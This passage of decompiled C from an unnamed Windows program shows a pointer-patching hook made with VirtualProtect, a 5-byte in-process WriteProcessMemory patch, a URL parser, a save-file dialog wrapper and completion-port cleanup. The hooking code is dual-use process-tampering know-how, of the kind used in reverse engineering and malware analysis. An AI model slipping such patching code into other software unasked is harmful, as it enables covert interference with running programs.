          ppvVar7 = ppvVar7 + 1;
        }
        VirtualQuery(lpAddress,&local_28,0x1c);
        VirtualProtect(local_28.BaseAddress,local_28.RegionSize,4,&local_28.Protect);
        if (param_4 == (char *)0x0) {
          *(undefined4 *)((int)this + 0x20) = 0;
          param_4 = *(char **)((int)this + 0x18);
        }
        else {
          *(undefined4 *)((int)this + 0x20) = 2;
          *(char **)((int)this + 0x18) = *lpAddress;
        }
        *lpAddress = param_4;
        VirtualProtect(local_28.BaseAddress,local_28.RegionSize,local_28.Protect,&local_c);
LAB_00403146:
        return *(int *)((int)this + 0x20) != 0;
      }
    }
  }
  return false;
}



bool __fastcall FUN_00403159(char **param_1)

{
  char *pcVar1;
  BOOL BVar2;
  
  pcVar1 = param_1[8];
  if (pcVar1 == (char *)0x1) {
    BVar2 = WriteProcessMemory((HANDLE)0xffffffff,param_1[6],param_1 + 2,5,(SIZE_T *)0x0);
    if (BVar2 == 0) goto LAB_004031ab;
  }
  else {
    if (pcVar1 == (char *)0x2) {
      FUN_00402fa4(param_1,(HMODULE)param_1[5],*param_1,param_1[1],(char *)0x0);
      goto LAB_004031ab;
    }
    if (pcVar1 != (char *)0x3) goto LAB_004031ab;
    if ((char **)param_1[10] != (char **)0x0) {
      *(char **)param_1[10] = param_1[6];
      param_1[6] = (char *)0x0;
      param_1[10] = (char *)0x0;
    }
  }
  param_1[8] = (char *)0x0;
LAB_004031ab:
  if (param_1[8] == (char *)0x0) {
    param_1[6] = (char *)0x0;
    param_1[7] = (char *)0x0;
    param_1[9] = (char *)0x0;
    if (*param_1 != (char *)0x0) {
      free(*param_1);
    }
    *param_1 = (char *)0x0;
    if (param_1[1] != (char *)0x0) {
      free(param_1[1]);
    }
    param_1[1] = (char *)0x0;
  }
  return param_1[8] == (char *)0x0;
}



undefined4 * __fastcall FUN_004031e6(undefined4 *param_1)

{
  void *_Dst;
  
  memset(param_1,0,0x4c);
  *param_1 = 0x4c;
  param_1[0x13] = 0;
  param_1[0x14] = 0;
  param_1[0x15] = 0;
  param_1[0x16] = 0;
  _Dst = operator_new(0x10000);
  param_1[0x17] = _Dst;
  memset(_Dst,0,0x10000);
  param_1[0x18] = 0;
  return param_1;
}



void __fastcall FUN_00403228(void *param_1)

{
  if (*(void **)((int)param_1 + 0x4c) != (void *)0x0) {
    free(*(void **)((int)param_1 + 0x4c));
  }
  if (*(void **)((int)param_1 + 0x50) != (void *)0x0) {
    free(*(void **)((int)param_1 + 0x50));
  }
  if (*(void **)((int)param_1 + 0x54) != (void *)0x0) {
    free(*(void **)((int)param_1 + 0x54));
  }
  if (*(void **)((int)param_1 + 0x58) != (void *)0x0) {
    operator_delete(*(void **)((int)param_1 + 0x58));
  }
  if (*(void **)((int)param_1 + 0x5c) != (void *)0x0) {
    operator_delete(*(void **)((int)param_1 + 0x5c));
  }
  FUN_004032fc(param_1,-1);
  return;
}



int __thiscall FUN_0040327b(void *this,char *param_1,char *param_2)

{
  size_t sVar1;
  char **ppcVar2;
  char *pcVar3;
  int iVar4;
  int local_4;
  
  local_4 = 0;
  if ((param_2 == (char *)0x0) || (sVar1 = strlen(param_2), sVar1 == 0)) {
    local_4 = -1;
  }
  else {
    ppcVar2 = (char **)operator_new(0xc);
    if (param_1 == (char *)0x0) {
      pcVar3 = (char *)0x0;
    }
    else {
      pcVar3 = _strdup(param_1);
    }
    *ppcVar2 = pcVar3;
    pcVar3 = _strdup(param_2);
    ppcVar2[2] = (char *)0x0;
    ppcVar2[1] = pcVar3;
    iVar4 = *(int *)((int)this + 0x60);
    if (*(int *)((int)this + 0x60) == 0) {
      *(char ***)((int)this + 0x60) = ppcVar2;
    }
    else {
      while (*(int *)(iVar4 + 8) != 0) {
        local_4 = local_4 + 1;
        iVar4 = *(int *)(iVar4 + 8);
      }
      local_4 = local_4 + 1;
      *(char ***)(iVar4 + 8) = ppcVar2;
    }
  }
  return local_4;
}



undefined4 __thiscall FUN_004032fc(void *this,int param_1)

{
  void *pvVar1;
  void *pvVar2;
  undefined4 uVar3;
  
  if (param_1 < 0) {
    pvVar2 = *(void **)((int)this + 0x60);
    while (pvVar2 != (void *)0x0) {
      pvVar2 = (*(void ***)((int)this + 0x60))[2];
      pvVar1 = **(void ***)((int)this + 0x60);
      if (pvVar1 != (void *)0x0) {
        free(pvVar1);
      }
      pvVar1 = *(void **)(*(int *)((int)this + 0x60) + 4);
      if (pvVar1 != (void *)0x0) {
        free(pvVar1);
      }
      operator_delete(*(void **)((int)this + 0x60));
      *(void **)((int)this + 0x60) = pvVar2;
    }
    uVar3 = 1;
  }
  else {
    uVar3 = 0;
  }
  return uVar3;
}



void __fastcall FUN_0040334f(int param_1)

{
  size_t sVar1;
  size_t sVar2;
  void *pvVar3;
  int iVar4;
  char **ppcVar5;
  size_t local_8;
  
  iVar4 = 0;
  for (ppcVar5 = *(char ***)(param_1 + 0x60); ppcVar5 != (char **)0x0; ppcVar5 = (char **)ppcVar5[2]
      ) {
    if (*ppcVar5 == (char *)0x0) {
      sVar1 = 0;
    }
    else {
      sVar1 = strlen(*ppcVar5);
    }
    if (ppcVar5[1] == (char *)0x0) {
      sVar2 = 0;
    }
    else {
      sVar2 = strlen(ppcVar5[1]);
    }
    iVar4 = iVar4 + sVar1 + 2 + sVar2;
  }
  if (*(void **)(param_1 + 0x58) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x58));
  }
  *(undefined4 *)(param_1 + 0x58) = 0;
  if (iVar4 != 0) {
    pvVar3 = operator_new(iVar4 + 1);
    ppcVar5 = *(char ***)(param_1 + 0x60);
    *(void **)(param_1 + 0x58) = pvVar3;
    iVar4 = 0;
    for (; ppcVar5 != (char **)0x0; ppcVar5 = (char **)ppcVar5[2]) {
      if (*ppcVar5 == (char *)0x0) {
        local_8 = 0;
      }
      else {
        local_8 = strlen(*ppcVar5);
      }
      if (local_8 != 0) {
        memcpy((void *)(*(int *)(param_1 + 0x58) + iVar4),*ppcVar5,local_8);
        iVar4 = iVar4 + local_8;
      }
      *(undefined *)(*(int *)(param_1 + 0x58) + iVar4) = 0;
      iVar4 = iVar4 + 1;
      if (ppcVar5[1] == (char *)0x0) {
        local_8 = 0;
      }
      else {
        local_8 = strlen(ppcVar5[1]);
      }
      if (local_8 != 0) {
        memcpy((void *)(*(int *)(param_1 + 0x58) + iVar4),ppcVar5[1],local_8);
        iVar4 = iVar4 + local_8;
      }
      *(undefined *)(*(int *)(param_1 + 0x58) + iVar4) = 0;
      iVar4 = iVar4 + 1;
    }
    *(undefined *)(*(int *)(param_1 + 0x58) + iVar4) = 0;
  }
  return;
}



undefined4 __thiscall FUN_00403446(void *this,char *param_1)

{
  char *pcVar1;
  
  if (*(void **)((int)this + 0x50) != (void *)0x0) {
    free(*(void **)((int)this + 0x50));
  }
  if (param_1 == (char *)0x0) {
    pcVar1 = (char *)0x0;
  }
  else {
    pcVar1 = _strdup(param_1);
  }
  *(char **)((int)this + 0x50) = pcVar1;
  return 1;
}



undefined4 __thiscall FUN_00403478(void *this,uint param_1)

{
  *(uint *)((int)this + 0x34) = *(uint *)((int)this + 0x34) | param_1;
  return *(undefined4 *)((int)this + 0x34);
}



HWND __fastcall FUN_00403485(LPOPENFILENAMEA param_1)

{
  BOOL BVar1;
  HWND pHVar2;
  
  FUN_0040334f((int)param_1);
  param_1->lpstrFile = (LPSTR)param_1[1].hwndOwner;
  param_1->lpstrFilter = (LPCSTR)param_1[1].lStructSize;
  param_1->lpstrInitialDir = (LPCSTR)param_1->FlagsEx;
  param_1->lpstrDefExt = (LPCSTR)param_1->dwReserved;
  param_1->nMaxFile = 0x104;
  param_1->lpstrTitle = (LPCSTR)param_1->pvReserved;
  BVar1 = GetSaveFileNameA(param_1);
  if (BVar1 == 0) {
    CommDlgExtendedError();
    pHVar2 = (HWND)0x0;
  }
  else {
    pHVar2 = param_1[1].hwndOwner;
  }
  return pHVar2;
}



int __thiscall FUN_004034ce(void *this,int param_1)

{
  int iVar1;
  
  iVar1 = 0;
  if (param_1 == 0) {
    if (*(int *)((int)this + 0x5c) != 0) {
      iVar1 = (uint)*(ushort *)((int)this + 0x38) + *(int *)((int)this + 0x5c);
    }
  }
  else {
    iVar1 = *(int *)((int)this + 0x5c);
  }
  return iVar1;
}



void __fastcall FUN_004034eb(undefined4 *param_1)

{
  *param_1 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *(undefined2 *)(param_1 + 4) = 0;
  param_1[5] = 0;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  param_1[9] = 0;
  param_1[10] = 0;
  return;
}



void __fastcall thunk_FUN_00403516(void **param_1)

{
  if (*param_1 != (void *)0x0) {
    operator_delete(*param_1);
  }
  *param_1 = (void *)0x0;
  if (param_1[1] != (void *)0x0) {
    operator_delete(param_1[1]);
  }
  param_1[1] = (void *)0x0;
  if (param_1[2] != (void *)0x0) {
    operator_delete(param_1[2]);
  }
  param_1[2] = (void *)0x0;
  if (param_1[3] != (void *)0x0) {
    operator_delete(param_1[3]);
  }
  param_1[3] = (void *)0x0;
  *(undefined2 *)(param_1 + 4) = 0;
  if (param_1[5] != (void *)0x0) {
    operator_delete(param_1[5]);
  }
  param_1[5] = (void *)0x0;
  if (param_1[6] != (void *)0x0) {
    operator_delete(param_1[6]);
  }
  param_1[6] = (void *)0x0;
  if (param_1[7] != (void *)0x0) {
    operator_delete(param_1[7]);
  }
  param_1[7] = (void *)0x0;
  if (param_1[8] != (void *)0x0) {
    operator_delete(param_1[8]);
  }
  param_1[8] = (void *)0x0;
  if (param_1[9] != (void *)0x0) {
    operator_delete(param_1[9]);
  }
  param_1[9] = (void *)0x0;
  if (param_1[10] != (void *)0x0) {
    operator_delete(param_1[10]);
  }
  param_1[10] = (void *)0x0;
  return;
}



void __fastcall FUN_00403516(void **param_1)

{
  if (*param_1 != (void *)0x0) {
    operator_delete(*param_1);
  }
  *param_1 = (void *)0x0;
  if (param_1[1] != (void *)0x0) {
    operator_delete(param_1[1]);
  }
  param_1[1] = (void *)0x0;
  if (param_1[2] != (void *)0x0) {
    operator_delete(param_1[2]);
  }
  param_1[2] = (void *)0x0;
  if (param_1[3] != (void *)0x0) {
    operator_delete(param_1[3]);
  }
  param_1[3] = (void *)0x0;
  *(undefined2 *)(param_1 + 4) = 0;
  if (param_1[5] != (void *)0x0) {
    operator_delete(param_1[5]);
  }
  param_1[5] = (void *)0x0;
  if (param_1[6] != (void *)0x0) {
    operator_delete(param_1[6]);
  }
  param_1[6] = (void *)0x0;
  if (param_1[7] != (void *)0x0) {
    operator_delete(param_1[7]);
  }
  param_1[7] = (void *)0x0;
  if (param_1[8] != (void *)0x0) {
    operator_delete(param_1[8]);
  }
  param_1[8] = (void *)0x0;
  if (param_1[9] != (void *)0x0) {
    operator_delete(param_1[9]);
  }
  param_1[9] = (void *)0x0;
  if (param_1[10] != (void *)0x0) {
    operator_delete(param_1[10]);
  }
  param_1[10] = (void *)0x0;
  return;
}



undefined4 __thiscall FUN_004035cb(void *this,char *param_1)

{
  char cVar1;
  size_t sVar2;
  void *pvVar3;
  char *pcVar4;
  int iVar5;
  uint uVar6;
  char *pcVar7;
  char *pcVar8;
  char *pcVar9;
  
  if ((param_1 == (char *)0x0) || (sVar2 = strlen(param_1), sVar2 == 0)) {
    return 0;
  }
  FUN_00403516((void **)this);
  strlen(param_1);
  sVar2 = strlen(param_1);
  pvVar3 = operator_new(sVar2 + 1);
  *(void **)((int)this + 0x28) = pvVar3;
  sVar2 = strlen(param_1);
  memcpy(*(void **)((int)this + 0x28),param_1,sVar2);
  sVar2 = strlen(param_1);
  *(undefined *)(sVar2 + *(int *)((int)this + 0x28)) = 0;
  pcVar7 = *(char **)((int)this + 0x28);
  pcVar4 = strchr(pcVar7,0x3a);
  if (pcVar4 == pcVar7) {
    return 0;
  }
  if (((pcVar7 < pcVar4) && (pcVar4[1] == '/')) && (pcVar4[2] == '/')) {
    sVar2 = (int)pcVar4 - (int)pcVar7;
    if (-1 < (int)sVar2) {
      pvVar3 = operator_new(sVar2 + 1);
      *(void **)this = pvVar3;
      memcpy(pvVar3,pcVar7,sVar2);
                    // WARNING: Load size is inaccurate
      pcVar4[*this - (int)pcVar7] = '\0';
    }
    pcVar7 = pcVar4 + 3;
  }
                    // WARNING: Load size is inaccurate
  if (*this == 0) {
    pvVar3 = operator_new(5);
    *(void **)this = pvVar3;
    memcpy(pvVar3,&DAT_0040e404,4);
                    // WARNING: Load size is inaccurate
    *(undefined *)(*this + 4) = 0;
  }
  pcVar4 = strchr(pcVar7,0x3a);
  if (pcVar4 == pcVar7) {
    return 0;
  }
  if (pcVar7 < pcVar4) {
    pcVar4 = pcVar4 + 1;
    iVar5 = atoi(pcVar4);
    *(short *)((int)this + 0x10) = (short)iVar5;
    if ((short)iVar5 == 0) {
      return 0;
    }
    uVar6 = (int)pcVar4 - (int)pcVar7;
    if (-1 < (int)(uVar6 - 1)) {
      pvVar3 = operator_new(uVar6);
      *(void **)((int)this + 0xc) = pvVar3;
      memcpy(pvVar3,pcVar7,uVar6 - 1);
      pcVar4[*(int *)((int)this + 0xc) + (-1 - (int)pcVar7)] = '\0';
    }
    pcVar4 = strchr(pcVar4,0x2f);
  }
  else {
    pcVar4 = strchr(pcVar7,0x2f);
    if (((pcVar4 == (char *)0x0) && (pcVar4 = strchr(pcVar7,0x3f), pcVar4 == (char *)0x0)) &&
       (pcVar4 = strchr(pcVar7,0x3b), pcVar4 == (char *)0x0)) {
      pcVar4 = strchr(pcVar7,0x23);
    }
    if (pcVar4 == pcVar7) {
      return 0;
    }
    if (pcVar7 < pcVar4) {
      sVar2 = (int)pcVar4 - (int)pcVar7;
      if (-1 < (int)sVar2) {
        pvVar3 = operator_new(sVar2 + 1);
        *(void **)((int)this + 0xc) = pvVar3;
        memcpy(pvVar3,pcVar7,sVar2);
        pcVar4[*(int *)((int)this + 0xc) - (int)pcVar7] = '\0';
      }
    }
    else {
      strlen(pcVar7);
      sVar2 = strlen(pcVar7);
      pvVar3 = operator_new(sVar2 + 1);
      *(void **)((int)this + 0xc) = pvVar3;
      sVar2 = strlen(pcVar7);
      memcpy(*(void **)((int)this + 0xc),pcVar7,sVar2);
      sVar2 = strlen(pcVar7);
      *(undefined *)(sVar2 + *(int *)((int)this + 0xc)) = 0;
      pcVar4 = (char *)0x0;
    }
  }
  if (*(short *)((int)this + 0x10) == 0) {
                    // WARNING: Load size is inaccurate
    iVar5 = _stricmp(*this,&DAT_0040e404);
    if (iVar5 == 0) {
      *(undefined2 *)((int)this + 0x10) = 0x50;
    }
    else {
                    // WARNING: Load size is inaccurate
      iVar5 = _stricmp(*this,&DAT_0040e400);
      *(ushort *)((int)this + 0x10) = (-(ushort)(iVar5 != 0) & 0xffeb) + 0x15;
    }
  }
  pcVar7 = strchr(*(char **)((int)this + 0xc),0x2e);
  if (pcVar7 == pcVar4) {
    return 0;
  }
  pcVar9 = *(char **)((int)this + 0xc);
  if (pcVar9 < pcVar7) {
    pcVar9 = pcVar7 + 1;
    pcVar8 = strchr(pcVar9,0x2e);
    if ((pcVar8 != (char *)0x0) &&
       (iVar5 = Ordinal_11(*(undefined4 *)((int)this + 0xc)), iVar5 == -1)) {
      iVar5 = (int)pcVar7 - *(int *)((int)this + 0xc);
      if (-1 < iVar5) {
        pvVar3 = operator_new(iVar5 + 1);
        *(void **)((int)this + 4) = pvVar3;
        memcpy(pvVar3,*(void **)((int)this + 0xc),(int)pcVar7 - (int)*(void **)((int)this + 0xc));
        pcVar7[*(int *)((int)this + 4) - *(int *)((int)this + 0xc)] = '\0';
      }
      strlen(pcVar9);
      sVar2 = strlen(pcVar9);
      pvVar3 = operator_new(sVar2 + 1);
      *(void **)((int)this + 8) = pvVar3;
      sVar2 = strlen(pcVar9);
      memcpy(*(void **)((int)this + 8),pcVar9,sVar2);
      sVar2 = strlen(pcVar9);
      goto LAB_00403904;
    }
    pcVar9 = *(char **)((int)this + 0xc);
  }
  strlen(pcVar9);
  sVar2 = strlen(*(char **)((int)this + 0xc));
  pvVar3 = operator_new(sVar2 + 1);
  *(void **)((int)this + 4) = pvVar3;
  sVar2 = strlen(*(char **)((int)this + 0xc));
  memcpy(*(void **)((int)this + 4),*(void **)((int)this + 0xc),sVar2);
  sVar2 = strlen(*(char **)((int)this + 0xc));
  *(undefined *)(sVar2 + *(int *)((int)this + 4)) = 0;
  strlen(*(char **)((int)this + 0xc));
  sVar2 = strlen(*(char **)((int)this + 0xc));
  pvVar3 = operator_new(sVar2 + 1);
  *(void **)((int)this + 8) = pvVar3;
  sVar2 = strlen(*(char **)((int)this + 0xc));
  memcpy(*(void **)((int)this + 8),*(void **)((int)this + 0xc),sVar2);
  sVar2 = strlen(*(char **)((int)this + 0xc));
LAB_00403904:
  *(undefined *)(sVar2 + *(int *)((int)this + 8)) = 0;
  if (pcVar4 == (char *)0x0) {
    pvVar3 = operator_new(2);
    *(void **)((int)this + 0x24) = pvVar3;
    memcpy(pvVar3,&DAT_0040e3fc,1);
    *(undefined *)(*(int *)((int)this + 0x24) + 1) = 0;
    pvVar3 = operator_new(2);
    *(void **)((int)this + 0x14) = pvVar3;
    memcpy(pvVar3,&DAT_0040e3fc,1);
    *(undefined *)(*(int *)((int)this + 0x14) + 1) = 0;
  }
  else {
    strlen(pcVar4);
    sVar2 = strlen(pcVar4);
    pvVar3 = operator_new(sVar2 + 1);
    *(void **)((int)this + 0x24) = pvVar3;
    sVar2 = strlen(pcVar4);
    memcpy(*(void **)((int)this + 0x24),pcVar4,sVar2);
    sVar2 = strlen(pcVar4);
    *(undefined *)(sVar2 + *(int *)((int)this + 0x24)) = 0;
    cVar1 = *pcVar4;
    pcVar7 = pcVar4;
    while (cVar1 != '\0') {
      if (((cVar1 == '?') || (cVar1 == ';')) || (cVar1 == '#')) {
        if (pcVar7 == pcVar4) {
          pvVar3 = operator_new(2);
          *(void **)((int)this + 0x14) = pvVar3;
          memcpy(pvVar3,&DAT_0040e3f8,1);
          *(undefined *)(*(int *)((int)this + 0x14) + 1) = 0;
        }
        else if ((pcVar4 < pcVar7) && (sVar2 = (int)pcVar7 - (int)pcVar4, -1 < (int)sVar2)) {
          pvVar3 = operator_new(sVar2 + 1);
          *(void **)((int)this + 0x14) = pvVar3;
          memcpy(pvVar3,pcVar4,sVar2);
          pcVar7[*(int *)((int)this + 0x14) - (int)pcVar4] = '\0';
        }
        cVar1 = *pcVar7;
        if (cVar1 == '?') {
          pcVar9 = strchr(pcVar4,0x3b);
          if ((pcVar9 == (char *)0x0) && (pcVar9 = strchr(pcVar4,0x23), pcVar9 == (char *)0x0)) {
            pcVar9 = (char *)strlen(pcVar7 + 1);
          }
          else {
            pcVar9 = pcVar9 + (-1 - (int)pcVar7);
          }
          if (pcVar9 == (char *)0x0) break;
          if (-1 < (int)pcVar9) {
            pvVar3 = operator_new((uint)(pcVar9 + 1));
            *(void **)((int)this + 0x18) = pvVar3;
            memcpy(pvVar3,pcVar7 + 1,(size_t)pcVar9);
            pcVar9[*(int *)((int)this + 0x18)] = '\0';
          }
          iVar5 = *(int *)((int)this + 0x18);
        }
        else if (cVar1 == ';') {
          pcVar9 = strchr(pcVar4,0x3f);
          if ((pcVar9 == (char *)0x0) && (pcVar9 = strchr(pcVar4,0x23), pcVar9 == (char *)0x0)) {
            pcVar9 = (char *)strlen(pcVar7 + 1);
          }
          else {
            pcVar9 = pcVar9 + (-1 - (int)pcVar7);
          }
          if (pcVar9 == (char *)0x0) break;
          if (-1 < (int)pcVar9) {
            pvVar3 = operator_new((uint)(pcVar9 + 1));
            *(void **)((int)this + 0x1c) = pvVar3;
            memcpy(pvVar3,pcVar7 + 1,(size_t)pcVar9);
            pcVar9[*(int *)((int)this + 0x1c)] = '\0';
          }
          iVar5 = *(int *)((int)this + 0x1c);
        }
        else {
          if (cVar1 != '#') break;
          pcVar9 = strchr(pcVar4,0x3f);
          if ((pcVar9 == (char *)0x0) && (pcVar9 = strchr(pcVar4,0x3b), pcVar9 == (char *)0x0)) {
            pcVar9 = (char *)strlen(pcVar7 + 1);
          }
          else {
            pcVar9 = pcVar9 + (-1 - (int)pcVar7);
          }
          if (pcVar9 == (char *)0x0) break;
          if (-1 < (int)pcVar9) {
            pvVar3 = operator_new((uint)(pcVar9 + 1));
            *(void **)((int)this + 0x20) = pvVar3;
            memcpy(pvVar3,pcVar7 + 1,(size_t)pcVar9);
            pcVar9[*(int *)((int)this + 0x20)] = '\0';
          }
          iVar5 = *(int *)((int)this + 0x20);
        }
        cVar1 = pcVar9[iVar5 + -1];
        if ((((cVar1 == '?') || (cVar1 == ';')) || (cVar1 == '#')) || (cVar1 == '&')) {
          pcVar9[iVar5 + -1] = '\0';
        }
        break;
      }
      pcVar9 = pcVar7 + 1;
      pcVar7 = pcVar7 + 1;
      cVar1 = *pcVar9;
    }
    if (*(int *)((int)this + 0x14) == 0) {
      strlen(pcVar4);
      sVar2 = strlen(pcVar4);
      pvVar3 = operator_new(sVar2 + 1);
      *(void **)((int)this + 0x14) = pvVar3;
      sVar2 = strlen(pcVar4);
      memcpy(*(void **)((int)this + 0x14),pcVar4,sVar2);
      sVar2 = strlen(pcVar4);
      *(undefined *)(sVar2 + *(int *)((int)this + 0x14)) = 0;
    }
  }
  return 1;
}



undefined4 __fastcall FUN_00403b6d(undefined4 *param_1)

{
  return *param_1;
}



undefined2 __fastcall FUN_00403b70(int param_1)

{
  return *(undefined2 *)(param_1 + 0x10);
}



undefined4 __fastcall FUN_00403b75(int param_1)

{
  return *(undefined4 *)(param_1 + 0xc);
}



undefined4 __fastcall FUN_00403b79(int param_1)

{
  return *(undefined4 *)(param_1 + 0x14);
}



undefined4 __fastcall FUN_00403b7d(int param_1)

{
  return *(undefined4 *)(param_1 + 0x18);
}



undefined4 __fastcall FUN_00403b81(int param_1)

{
  return *(undefined4 *)(param_1 + 0x1c);
}



undefined4 __fastcall FUN_00403b85(int param_1)

{
  return *(undefined4 *)(param_1 + 0x20);
}



undefined4 __fastcall FUN_00403b89(int param_1)

{
  return *(undefined4 *)(param_1 + 0x24);
}



undefined4 * __fastcall FUN_00403b8d(undefined4 *param_1)

{
  FUN_004072e7(param_1);
  param_1[0x16] = 0;
  param_1[0x17] = 0;
  *param_1 = &PTR_LAB_0040bec4;
  return param_1;
}



void __fastcall FUN_00403ba7(undefined4 *param_1)

{
  *param_1 = &PTR_LAB_0040bec4;
  FUN_00407382(param_1);
  return;
}



void __thiscall FUN_00403bb2(void *this,undefined4 param_1,undefined4 param_2)

{
  *(undefined4 *)((int)this + 0x58) = param_1;
  *(undefined4 *)((int)this + 0x5c) = param_2;
  FUN_00407682(this,1,0x400);
  return;
}



undefined4 __fastcall thunk_FUN_0040783f(void *param_1)

{
  int iVar1;
  
  EnterCriticalSection((LPCRITICAL_SECTION)((int)param_1 + 0x18));
  if (*(int *)((int)param_1 + 0x10) != 0) {
    if (*(int *)((int)param_1 + 8) != 0) {
      iVar1 = 0;
      if (0 < *(int *)((int)param_1 + 0xc)) {
        do {
          PostQueuedCompletionStatus(*(HANDLE *)((int)param_1 + 8),0,0xffffffff,(LPOVERLAPPED)0x0);
          iVar1 = iVar1 + 1;
        } while (iVar1 < *(int *)((int)param_1 + 0xc));
      }
      WaitForMultipleObjects
                (*(DWORD *)((int)param_1 + 0xc),*(HANDLE **)((int)param_1 + 0x10),1,0xffffffff);
      CloseHandle(*(HANDLE *)((int)param_1 + 8));
      *(undefined4 *)((int)param_1 + 8) = 0;
    }
    iVar1 = 0;
    if (0 < *(int *)((int)param_1 + 0xc)) {
      do {
        CloseHandle(*(HANDLE *)(*(int *)((int)param_1 + 0x10) + iVar1 * 4));
        iVar1 = iVar1 + 1;
      } while (iVar1 < *(int *)((int)param_1 + 0xc));
    }
    operator_delete(*(void **)((int)param_1 + 0x10));
    *(undefined4 *)((int)param_1 + 0x10) = 0;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)param_1 + 0x18));
  FUN_004078cd(param_1,0);
  return 0;
}



void FUN_00403bd4(void)

{
  void *this;
  undefined4 extraout_ECX;
  int unaff_EBP;
  
  FUN_0040a1d0();
  this = operator_new(0x1b8);
  *(void **)(unaff_EBP + -0x10) = this;
  *(undefined4 *)(unaff_EBP + -4) = 0;
  if (this != (void *)0x0) {
    FUN_00403cce(this,extraout_ECX);
  }
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



undefined4 __thiscall FUN_00403c0e(void *this,void **param_1)

{
  undefined4 uVar1;
  
  if ((param_1 == (void **)0x0) || (*param_1 != this)) {
    uVar1 = 0;
  }
  else {
    if (param_1[0xe] != (void *)0x0) {
      FUN_004087d7(this,(uint)param_1[0xe],0,0);
      FUN_00404939(param_1);
      FUN_00407ecf(this,(uint *)param_1[0xe]);
    }
    FUN_00403d2c();
    operator_delete(param_1);
    uVar1 = 1;
  }
  return uVar1;
}



void __thiscall FUN_00403c61(void *this,uint param_1)

{
  void *pvVar1;
  undefined8 uVar2;
  
  uVar2 = FUN_0040882a(this,param_1);
  pvVar1 = (void *)uVar2;
  if ((pvVar1 != (void *)0x0) && (*(uint *)((int)pvVar1 + 0x38) == param_1)) {
    FUN_00404939(pvVar1);
  }
  return;
}



void __thiscall FUN_00403c84(void *this,uint param_1,size_t param_2,char *param_3)

{
  void *this_00;
  undefined8 uVar1;
  
  uVar1 = FUN_0040882a(this,param_1);
  this_00 = (void *)uVar1;
  if ((this_00 != (void *)0x0) && (*(uint *)((int)this_00 + 0x38) == param_1)) {
    FUN_00404947(this_00,param_2,param_3);
  }
  return;
}



void __thiscall FUN_00403cab(void *this,uint param_1)

{
  undefined8 uVar1;
  
  uVar1 = FUN_0040882a(this,param_1);
  if (((int)uVar1 != 0) && (*(uint *)((int)uVar1 + 0x38) == param_1)) {
    FUN_00404c78();
  }
  return;
}



undefined4 * __thiscall FUN_00403cce(void *this,undefined4 param_1)

{
  HANDLE pvVar1;
  
  FUN_004034eb((undefined4 *)((int)this + 4));
  *(undefined4 *)this = param_1;
  *(undefined4 *)((int)this + 0x34) = 0;
  *(undefined4 *)((int)this + 0x38) = 0;
  *(undefined4 *)((int)this + 0x3c) = 0;
  *(undefined4 *)((int)this + 0x40) = 0;
  *(undefined4 *)((int)this + 0x44) = 0;
  *(undefined4 *)((int)this + 0x30) = 0;
  pvVar1 = CreateEventA((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCSTR)0x0);
  *(HANDLE *)((int)this + 0x48) = pvVar1;
  memset((void *)((int)this + 0x4c),0,0xd4);
  memset((void *)((int)this + 0x120),0,0x98);
  return (undefined4 *)this;
}



void FUN_00403d2c(void)

{
  int *piVar1;
  int extraout_ECX;
  int unaff_EBP;
  void **ppvVar2;
  
  FUN_0040a1d0();
  *(int *)(unaff_EBP + -0x14) = extraout_ECX;
  ppvVar2 = (void **)(extraout_ECX + 300);
  *(undefined4 *)(unaff_EBP + -4) = 0;
  *(undefined4 *)(unaff_EBP + -0x10) = 0x1e;
  do {
    if (*ppvVar2 != (void *)0x0) {
      operator_delete(*ppvVar2);
      *ppvVar2 = (void *)0x0;
    }
    ppvVar2 = ppvVar2 + 1;
    piVar1 = (int *)(unaff_EBP + -0x10);
    *piVar1 = *piVar1 + -1;
  } while (*piVar1 != 0);
  if (*(void **)(extraout_ECX + 0x1a4) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x1a4));
  }
  if (*(void **)(extraout_ECX + 0x120) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x120));
  }
  if (*(void **)(extraout_ECX + 0x128) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x128));
  }
  if (*(void **)(extraout_ECX + 0x1b4) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x1b4));
  }
  memset((void *)(extraout_ECX + 0x120),0,0x98);
  ppvVar2 = (void **)(extraout_ECX + 0x54);
  *(undefined4 *)(unaff_EBP + -0x10) = 0x32;
  do {
    if (*ppvVar2 != (void *)0x0) {
      operator_delete(*ppvVar2);
      *ppvVar2 = (void *)0x0;
    }
    ppvVar2 = ppvVar2 + 1;
    piVar1 = (int *)(unaff_EBP + -0x10);
    *piVar1 = *piVar1 + -1;
  } while (*piVar1 != 0);
  if (*(void **)(extraout_ECX + 0x11c) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x11c));
  }
  if (*(void **)(extraout_ECX + 0x4c) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x4c));
  }
  memset((void *)(extraout_ECX + 0x4c),0,0xd4);
  CloseHandle(*(HANDLE *)(extraout_ECX + 0x48));
  *(undefined4 *)(extraout_ECX + 0x48) = 0;
  if (*(void **)(extraout_ECX + 0x30) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x30));
  }
  *(undefined4 *)(extraout_ECX + 0x30) = 0;
  if (*(void **)(extraout_ECX + 0x40) != (void *)0x0) {
    operator_delete(*(void **)(extraout_ECX + 0x40));
  }
  *(undefined4 *)(unaff_EBP + -4) = 0xffffffff;
  *(undefined4 *)(extraout_ECX + 0x40) = 0;
  thunk_FUN_00403516((void **)(extraout_ECX + 4));
  ExceptionList = *(void **)(unaff_EBP + -0xc);
  return;
}



undefined4 __thiscall FUN_00403e5d(void *this,char *param_1,int param_2,int param_3,int param_4)

{
  bool bVar1;
  undefined3 extraout_var;
  size_t sVar2;
  int iVar3;
  char *pcVar4;
  void *pvVar5;
  undefined4 uVar6;
  char *_Str2;
  undefined4 local_c4;
  undefined4 uStack_c0;
  char cStack_bc;
  undefined4 local_bb;
  undefined2 uStack_b7;
  undefined uStack_b5;
  undefined4 local_b4;
  undefined4 uStack_b0;
  char cStack_ac;
